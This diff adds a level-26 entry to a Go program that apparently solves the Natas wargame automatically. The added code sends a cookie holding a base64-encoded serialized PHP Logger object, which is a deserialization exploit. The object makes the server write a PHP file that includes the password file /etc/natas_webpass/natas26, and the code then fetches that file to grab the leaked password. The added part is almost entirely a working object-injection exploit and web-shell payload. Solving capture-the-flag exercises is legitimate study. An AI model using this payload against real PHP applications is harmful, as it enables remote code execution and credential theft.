@@ -737,6 +737,31 @@ var levels = [...]Grabber{
 			},
 		},
 	},
+	//level 26
+	Headers{
+		Path{
+			Prefixed{
+				grab,
+				"Password: ",
+				32,
+			},
+			Text{"/img/the_password.php"},
+		},
+		SetData{
+			"Upgrade-Insecure-Requests": Contains{
+				Headers{
+					grab,
+					SetData{
+						"Cookie": Combine{
+							Text{"drawing="},
+							Base64Encode{Text{"O:6:\"Logger\":3:{s:15:\"\x00Logger\x00logFile\";s:20:\"img/the_password.php\";s:15:\"\x00Logger\x00initMsg\";s:0:\"\";s:15:\"\x00Logger\x00exitMsg\";s:64:\"<?php echo \"Password: \";include(\"/etc/natas_webpass/natas26\");?>\";}"}},
+						},
+					},
+				},
+				"Cannot use object of type Logger as array",
+			},
+		},
+	},
 }
 
 func e(err error) {
